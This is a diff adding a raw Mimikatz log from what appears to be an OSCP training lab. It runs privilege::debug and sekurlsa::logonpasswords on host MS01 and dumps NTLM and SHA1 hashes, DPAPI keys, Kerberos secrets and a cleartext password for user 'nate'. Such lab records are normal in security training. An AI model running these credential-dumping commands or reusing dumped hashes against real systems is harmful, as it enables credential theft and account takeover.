@@ -1,0 +1,352 @@
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 3636250 (00000000:00377c1a)
+Session           : RemoteInteractive from 2
+User Name         : nate
+Domain            : oscp
+Logon Server      : DC01
+Logon Time        : 5/19/2024 10:38:18 PM
+SID               : S-1-5-21-395943061-4281203283-1985023469-1106
+	msv :	
+	 [00000003] Primary
+	 * Username : nate
+	 * Domain   : oscp
+	 * NTLM     : abc7186b67bf9833c6219e2ef80501ac
+	 * SHA1     : a81ab821baedaabd3867a2d258f40a3d22d3f583
+	 * DPAPI    : dc074f35e3a8b3ed0b2b31ac026ea634
+	tspkg :	
+	wdigest :	
+	 * Username : nate
+	 * Domain   : oscp
+	 * Password : (null)
+	kerberos :	
+	 * Username : nate
+	 * Domain   : OSCP.EXAM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 3636135 (00000000:00377ba7)
+Session           : RemoteInteractive from 2
+User Name         : nate
+Domain            : oscp
+Logon Server      : DC01
+Logon Time        : 5/19/2024 10:38:18 PM
+SID               : S-1-5-21-395943061-4281203283-1985023469-1106
+	msv :	
+	 [00000003] Primary
+	 * Username : nate
+	 * Domain   : oscp
+	 * NTLM     : abc7186b67bf9833c6219e2ef80501ac
+	 * SHA1     : a81ab821baedaabd3867a2d258f40a3d22d3f583
+	 * DPAPI    : dc074f35e3a8b3ed0b2b31ac026ea634
+	tspkg :	
+	wdigest :	
+	 * Username : nate
+	 * Domain   : oscp
+	 * Password : (null)
+	kerberos :	
+	 * Username : nate
+	 * Domain   : OSCP.EXAM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 159548 (00000000:00026f3c)
+Session           : Service from 0
+User Name         : nate
+Domain            : oscp
+Logon Server      : DC01
+Logon Time        : 10/31/2023 8:54:36 AM
+SID               : S-1-5-21-395943061-4281203283-1985023469-1106
+	msv :	
+	 [00000003] Primary
+	 * Username : nate
+	 * Domain   : oscp
+	 * NTLM     : abc7186b67bf9833c6219e2ef80501ac
+	 * SHA1     : a81ab821baedaabd3867a2d258f40a3d22d3f583
+	 * DPAPI    : dc074f35e3a8b3ed0b2b31ac026ea634
+	tspkg :	
+	wdigest :	
+	 * Username : nate
+	 * Domain   : oscp
+	 * Password : (null)
+	kerberos :	
+	 * Username : nate
+	 * Domain   : OSCP.EXAM
+	 * Password : mariposa
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 46655 (00000000:0000b63f)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 10/31/2023 8:54:23 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : fd37ffbe5f92c571a28c328c0f84987a
+	 * SHA1     : 6a48873fdcfb585f934b71513a09be176cb8c1b3
+	tspkg :	
+	wdigest :	
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * Password : (null)
+	kerberos :	
+	 * Username : MS01$
+	 * Domain   : oscp.exam
+	 * Password : ab 34 93 56 e6 e2 ef eb 44 45 90 38 47 a4 7b af 56 3f 57 7b 65 18 93 cd 78 f9 e1 ea 53 a8 04 cb 89 57 8c 60 46 ff 10 2f 12 53 a0 6d f2 23 35 6b 5c 5a a8 34 3a 1e 98 dc 32 42 e9 5e f6 5b 8c 56 6f 3b a2 5f db 93 ec f2 40 36 97 41 78 9a b5 75 d3 41 55 41 04 ca 3a 7b a4 58 6c 82 06 47 f2 ff ad 97 30 79 52 ac 8d b6 29 3c 65 eb 48 03 c3 49 c4 35 80 34 38 ba 9e d4 97 c9 1e 3a 0a 97 94 53 31 ec 8d a9 21 49 dc 73 61 0a ea e7 da 75 69 0d 99 ad ae 30 c1 f1 d1 f8 0c d2 a0 55 e1 59 b8 e8 48 94 1f d9 16 bf c9 e2 2a e3 d7 4c 1c 08 b6 d1 d5 76 87 22 4b 87 7c ad 2d 7d 81 5f f8 5e e9 30 1e e7 20 c7 be fa c2 70 5f 16 00 2c e4 a1 f6 a2 f0 b6 0a 78 ad 80 a3 cb c0 2a b3 fe ea a4 b5 7a e3 ca d8 d8 4a 0a 38 c7 a6 4a b7 8c 37 b1 90 57 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 46615 (00000000:0000b617)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 10/31/2023 8:54:23 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : fd37ffbe5f92c571a28c328c0f84987a
+	 * SHA1     : 6a48873fdcfb585f934b71513a09be176cb8c1b3
+	tspkg :	
+	wdigest :	
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * Password : (null)
+	kerberos :	
+	 * Username : MS01$
+	 * Domain   : oscp.exam
+	 * Password : ab 34 93 56 e6 e2 ef eb 44 45 90 38 47 a4 7b af 56 3f 57 7b 65 18 93 cd 78 f9 e1 ea 53 a8 04 cb 89 57 8c 60 46 ff 10 2f 12 53 a0 6d f2 23 35 6b 5c 5a a8 34 3a 1e 98 dc 32 42 e9 5e f6 5b 8c 56 6f 3b a2 5f db 93 ec f2 40 36 97 41 78 9a b5 75 d3 41 55 41 04 ca 3a 7b a4 58 6c 82 06 47 f2 ff ad 97 30 79 52 ac 8d b6 29 3c 65 eb 48 03 c3 49 c4 35 80 34 38 ba 9e d4 97 c9 1e 3a 0a 97 94 53 31 ec 8d a9 21 49 dc 73 61 0a ea e7 da 75 69 0d 99 ad ae 30 c1 f1 d1 f8 0c d2 a0 55 e1 59 b8 e8 48 94 1f d9 16 bf c9 e2 2a e3 d7 4c 1c 08 b6 d1 d5 76 87 22 4b 87 7c ad 2d 7d 81 5f f8 5e e9 30 1e e7 20 c7 be fa c2 70 5f 16 00 2c e4 a1 f6 a2 f0 b6 0a 78 ad 80 a3 cb c0 2a b3 fe ea a4 b5 7a e3 ca d8 d8 4a 0a 38 c7 a6 4a b7 8c 37 b1 90 57 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 3615983 (00000000:00372cef)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/19/2024 10:38:17 PM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : fd37ffbe5f92c571a28c328c0f84987a
+	 * SHA1     : 6a48873fdcfb585f934b71513a09be176cb8c1b3
+	tspkg :	
+	wdigest :	
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * Password : (null)
+	kerberos :	
+	 * Username : MS01$
+	 * Domain   : oscp.exam
+	 * Password : ab 34 93 56 e6 e2 ef eb 44 45 90 38 47 a4 7b af 56 3f 57 7b 65 18 93 cd 78 f9 e1 ea 53 a8 04 cb 89 57 8c 60 46 ff 10 2f 12 53 a0 6d f2 23 35 6b 5c 5a a8 34 3a 1e 98 dc 32 42 e9 5e f6 5b 8c 56 6f 3b a2 5f db 93 ec f2 40 36 97 41 78 9a b5 75 d3 41 55 41 04 ca 3a 7b a4 58 6c 82 06 47 f2 ff ad 97 30 79 52 ac 8d b6 29 3c 65 eb 48 03 c3 49 c4 35 80 34 38 ba 9e d4 97 c9 1e 3a 0a 97 94 53 31 ec 8d a9 21 49 dc 73 61 0a ea e7 da 75 69 0d 99 ad ae 30 c1 f1 d1 f8 0c d2 a0 55 e1 59 b8 e8 48 94 1f d9 16 bf c9 e2 2a e3 d7 4c 1c 08 b6 d1 d5 76 87 22 4b 87 7c ad 2d 7d 81 5f f8 5e e9 30 1e e7 20 c7 be fa c2 70 5f 16 00 2c e4 a1 f6 a2 f0 b6 0a 78 ad 80 a3 cb c0 2a b3 fe ea a4 b5 7a e3 ca d8 d8 4a 0a 38 c7 a6 4a b7 8c 37 b1 90 57 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 76546 (00000000:00012b02)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 10/31/2023 8:54:23 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : fd37ffbe5f92c571a28c328c0f84987a
+	 * SHA1     : 6a48873fdcfb585f934b71513a09be176cb8c1b3
+	tspkg :	
+	wdigest :	
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * Password : (null)
+	kerberos :	
+	 * Username : MS01$
+	 * Domain   : oscp.exam
+	 * Password : ab 34 93 56 e6 e2 ef eb 44 45 90 38 47 a4 7b af 56 3f 57 7b 65 18 93 cd 78 f9 e1 ea 53 a8 04 cb 89 57 8c 60 46 ff 10 2f 12 53 a0 6d f2 23 35 6b 5c 5a a8 34 3a 1e 98 dc 32 42 e9 5e f6 5b 8c 56 6f 3b a2 5f db 93 ec f2 40 36 97 41 78 9a b5 75 d3 41 55 41 04 ca 3a 7b a4 58 6c 82 06 47 f2 ff ad 97 30 79 52 ac 8d b6 29 3c 65 eb 48 03 c3 49 c4 35 80 34 38 ba 9e d4 97 c9 1e 3a 0a 97 94 53 31 ec 8d a9 21 49 dc 73 61 0a ea e7 da 75 69 0d 99 ad ae 30 c1 f1 d1 f8 0c d2 a0 55 e1 59 b8 e8 48 94 1f d9 16 bf c9 e2 2a e3 d7 4c 1c 08 b6 d1 d5 76 87 22 4b 87 7c ad 2d 7d 81 5f f8 5e e9 30 1e e7 20 c7 be fa c2 70 5f 16 00 2c e4 a1 f6 a2 f0 b6 0a 78 ad 80 a3 cb c0 2a b3 fe ea a4 b5 7a e3 ca d8 d8 4a 0a 38 c7 a6 4a b7 8c 37 b1 90 57 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 45333 (00000000:0000b115)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 10/31/2023 8:54:22 AM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : fd37ffbe5f92c571a28c328c0f84987a
+	 * SHA1     : 6a48873fdcfb585f934b71513a09be176cb8c1b3
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : MS01$
+Domain            : oscp
+Logon Server      : (null)
+Logon Time        : 10/31/2023 8:54:22 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * Password : (null)
+	kerberos :	
+	 * Username : ms01$
+	 * Domain   : OSCP.EXAM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 3616015 (00000000:00372d0f)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/19/2024 10:38:17 PM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : fd37ffbe5f92c571a28c328c0f84987a
+	 * SHA1     : 6a48873fdcfb585f934b71513a09be176cb8c1b3
+	tspkg :	
+	wdigest :	
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * Password : (null)
+	kerberos :	
+	 * Username : MS01$
+	 * Domain   : oscp.exam
+	 * Password : ab 34 93 56 e6 e2 ef eb 44 45 90 38 47 a4 7b af 56 3f 57 7b 65 18 93 cd 78 f9 e1 ea 53 a8 04 cb 89 57 8c 60 46 ff 10 2f 12 53 a0 6d f2 23 35 6b 5c 5a a8 34 3a 1e 98 dc 32 42 e9 5e f6 5b 8c 56 6f 3b a2 5f db 93 ec f2 40 36 97 41 78 9a b5 75 d3 41 55 41 04 ca 3a 7b a4 58 6c 82 06 47 f2 ff ad 97 30 79 52 ac 8d b6 29 3c 65 eb 48 03 c3 49 c4 35 80 34 38 ba 9e d4 97 c9 1e 3a 0a 97 94 53 31 ec 8d a9 21 49 dc 73 61 0a ea e7 da 75 69 0d 99 ad ae 30 c1 f1 d1 f8 0c d2 a0 55 e1 59 b8 e8 48 94 1f d9 16 bf c9 e2 2a e3 d7 4c 1c 08 b6 d1 d5 76 87 22 4b 87 7c ad 2d 7d 81 5f f8 5e e9 30 1e e7 20 c7 be fa c2 70 5f 16 00 2c e4 a1 f6 a2 f0 b6 0a 78 ad 80 a3 cb c0 2a b3 fe ea a4 b5 7a e3 ca d8 d8 4a 0a 38 c7 a6 4a b7 8c 37 b1 90 57 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : MS01$
+Domain            : oscp
+Logon Server      : (null)
+Logon Time        : 10/31/2023 8:54:23 AM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : fd37ffbe5f92c571a28c328c0f84987a
+	 * SHA1     : 6a48873fdcfb585f934b71513a09be176cb8c1b3
+	tspkg :	
+	wdigest :	
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * Password : (null)
+	kerberos :	
+	 * Username : ms01$
+	 * Domain   : OSCP.EXAM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 3614144 (00000000:003725c0)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/19/2024 10:38:17 PM
+SID               : S-1-5-96-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : fd37ffbe5f92c571a28c328c0f84987a
+	 * SHA1     : 6a48873fdcfb585f934b71513a09be176cb8c1b3
+	tspkg :	
+	wdigest :	
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * Password : (null)
+	kerberos :	
+	 * Username : MS01$
+	 * Domain   : oscp.exam
+	 * Password : ab 34 93 56 e6 e2 ef eb 44 45 90 38 47 a4 7b af 56 3f 57 7b 65 18 93 cd 78 f9 e1 ea 53 a8 04 cb 89 57 8c 60 46 ff 10 2f 12 53 a0 6d f2 23 35 6b 5c 5a a8 34 3a 1e 98 dc 32 42 e9 5e f6 5b 8c 56 6f 3b a2 5f db 93 ec f2 40 36 97 41 78 9a b5 75 d3 41 55 41 04 ca 3a 7b a4 58 6c 82 06 47 f2 ff ad 97 30 79 52 ac 8d b6 29 3c 65 eb 48 03 c3 49 c4 35 80 34 38 ba 9e d4 97 c9 1e 3a 0a 97 94 53 31 ec 8d a9 21 49 dc 73 61 0a ea e7 da 75 69 0d 99 ad ae 30 c1 f1 d1 f8 0c d2 a0 55 e1 59 b8 e8 48 94 1f d9 16 bf c9 e2 2a e3 d7 4c 1c 08 b6 d1 d5 76 87 22 4b 87 7c ad 2d 7d 81 5f f8 5e e9 30 1e e7 20 c7 be fa c2 70 5f 16 00 2c e4 a1 f6 a2 f0 b6 0a 78 ad 80 a3 cb c0 2a b3 fe ea a4 b5 7a e3 ca d8 d8 4a 0a 38 c7 a6 4a b7 8c 37 b1 90 57 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 10/31/2023 8:54:23 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 76564 (00000000:00012b14)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 10/31/2023 8:54:23 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * NTLM     : e91b56fb26b2d20a0bb6471d4fb9433d
+	 * SHA1     : d1d355b5f0cb4f8e1e430c072c21ec51029fd573
+	tspkg :	
+	wdigest :	
+	 * Username : MS01$
+	 * Domain   : oscp
+	 * Password : (null)
+	kerberos :	
+	 * Username : MS01$
+	 * Domain   : oscp.exam
+	 * Password : 4f 79 10 c7 de 06 51 98 89 14 e3 91 f0 c3 f8 2d a4 7e 73 f9 70 56 3a e5 be 07 de f9 8b 4f 24 ff d7 78 26 b2 ed c6 27 2a 6a 18 e7 fd e0 4d dc 77 16 50 1f 77 da 95 0e ba 12 ab 74 62 d5 06 58 a1 d3 78 c6 de 69 ce eb 2a c7 b3 d4 0c eb 23 ea d1 5d 3f 83 7a e8 71 99 65 e6 b8 2b 90 6b 06 85 e0 9a 0e 80 32 99 5e 0e 8c 13 86 08 a4 b3 31 d8 92 6a be 47 2a a1 38 52 a3 79 75 23 5e a3 2e ec bf cd 50 66 f5 8a 50 e1 10 40 81 90 78 1b 0a 2d 42 db 2b 23 46 92 13 79 9b 9e fd 27 ec 1c b7 eb b2 d1 57 70 b1 ff 87 3b ff 18 05 25 fe 6f 0d 8e b6 e1 79 e3 c2 48 8e 28 ee 40 03 32 4f c1 e3 1a cc 11 55 9c 36 96 88 8d d0 ba 1f d0 9f 48 b8 6c 32 6f de 0d c7 7b 0b fe 92 8b c9 85 00 fb 56 ab aa 3a c5 75 49 8d d5 17 ff c2 c4 21 b2 99 3c 59 4b 
+	ssp :	
+	credman :	
+
+mimikatz(commandline) # exit
+Bye!
